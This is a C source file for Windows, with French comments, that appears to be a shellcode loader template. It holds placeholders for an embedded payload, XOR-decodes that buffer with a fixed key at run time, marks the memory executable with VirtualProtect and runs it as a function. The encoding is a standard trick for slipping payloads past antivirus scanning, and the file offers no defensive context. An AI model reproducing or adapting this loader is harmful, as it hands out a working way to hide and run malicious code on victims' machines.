#include <windows.h>

int buflen = <BUFLEN>;
unsigned char buf[] = "<BUF>";

int main(void)
{
  for (size_t i = 0; i < buflen; i++)
  {
    buf[i] = buf[i] ^ 42; // On décode le buffer à l'exécution
  }

  // On exécute le buffer
  DWORD ignore;
  int (*func)();
  VirtualProtect(buf, buflen, PAGE_EXECUTE, &ignore);
  func = (int (*)())buf;
  (int)(*func)();
  return 0;
}
